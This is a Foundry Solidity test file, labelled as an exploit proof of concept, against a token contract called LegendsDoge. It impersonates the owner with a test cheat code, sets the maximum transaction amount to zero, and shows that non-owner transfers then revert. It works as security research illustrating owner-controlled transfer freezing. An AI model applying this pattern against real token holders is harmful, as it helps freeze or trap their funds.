// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface LegendsDoge {
    function owner() external view returns (address);
    function setMaxTxPercent(uint256 maxTxPercent) external;
    function _maxTxAmount() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xCd092F1f9858204d7986b3a2e36730fF1229a2e5;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner dynamically
        address owner = LegendsDoge(TARGET).owner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner
        address owner = LegendsDoge(TARGET).owner();

        // Impersonate the owner and set maxTxPercent to 0
        vm.prank(owner);
        LegendsDoge(TARGET).setMaxTxPercent(0);

        // Verify that _maxTxAmount is now 0
        uint256 maxTxAmount = LegendsDoge(TARGET)._maxTxAmount();
        assertEq(maxTxAmount, 0, "_maxTxAmount should be 0 after exploit");

        // Optional: Demonstrate that owner can still transfer but others cannot
        // by attempting a transfer from a non-owner address
        address nonOwner = address(0x123);
        vm.prank(nonOwner);
        vm.expectRevert("Transfer amount exceeds the maxTxAmount.");
        LegendsDoge(TARGET).transfer(address(0x456), 1);
        assertEq(LegendsDoge(TARGET)._maxTxAmount(), 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
